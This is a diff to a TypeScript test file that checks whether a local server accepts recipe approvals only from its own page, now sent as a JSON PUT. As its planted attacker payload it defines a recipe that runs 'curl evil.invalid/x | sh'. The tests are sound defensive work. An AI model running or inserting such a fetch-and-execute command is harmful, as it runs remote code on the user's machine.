@@ -67,11 +67,24 @@ const serve = async () => {
 /** The recipe an attacker would plant: a command, and the engine runs commands. */
 const EVIL = JSON.stringify({ install: 'curl evil.invalid/x | sh', services: [] });
 
+/**
+ * The approval, as 10i shaped it: a `PUT` with a JSON body.
+ *
+ * The envelope changed and the control did not. `sameOrigin` still runs before any route
+ * matches, which is why the three REFUSALS below would pass even against a surface with no
+ * write on it at all — and why the two acceptances beside them are what make this file mean
+ * anything. Both are here.
+ *
+ * The content type is now load-bearing in its own right: `routes.ts` refuses a `/api/` write
+ * that does not declare JSON, because the one request shape a browser can send cross-site
+ * with no preflight is exactly the one no JSON client sends. That refusal is asserted at the
+ * bottom of this file rather than assumed.
+ */
 const approve = (base: string, headers: Record<string, string>) =>
-  fetch(`${base}/repos/o/r/onboard`, {
-    method: 'POST',
-    headers: { 'content-type': 'application/x-www-form-urlencoded', ...headers },
-    body: new URLSearchParams({ recipe: EVIL }).toString(),
+  fetch(`${base}/api/repos/o%2Fr/recipe`, {
+    method: 'PUT',
+    headers: { 'content-type': 'application/json', ...headers },
+    body: JSON.stringify({ recipe: JSON.parse(EVIL) }),
     redirect: 'manual',
   });
 
@@ -99,8 +112,8 @@ describe('a recipe can only be approved from our own page', () => {
   it('accepts our own page', async () => {
     const base = await serve();
     const response = await approve(base, { 'sec-fetch-site': 'same-origin' });
-    // 303 back to the form: stored.
-    expect(response.status).toBe(303);
+    // 200 with the approval's timestamp: stored.
+    expect(response.status).toBe(200);
   });
 
   it('accepts a request with no browser headers at all', async () => {
@@ -108,7 +121,7 @@ describe('a recipe can only be approved from our own page', () => {
     // already requires code execution on the machine, at which point the recipe is the
     // least of it. Refusing these would break every non-browser client for no gain.
     const base = await serve();
-    expect((await approve(base, {})).status).toBe(303);
+    expect((await approve(base, {})).status).toBe(200);
   });
 
   it('leaves reads alone, because a projection can be rebuilt from the log', async () => {
@@ -116,7 +129,7 @@ describe('a recipe can only be approved from our own page', () => {
     // attacker could not get by asking the engine to run, and blocking it would break
     // linking to a run from anywhere.
     const base = await serve();
-    const response = await fetch(`${base}/runs`, { headers: { 'sec-fetch-site': 'cross-site' } });
+    const response = await fetch(`${base}/api/runs`, { headers: { 'sec-fetch-site': 'cross-site' } });
     expect(response.status).toBe(200);
   });
 });
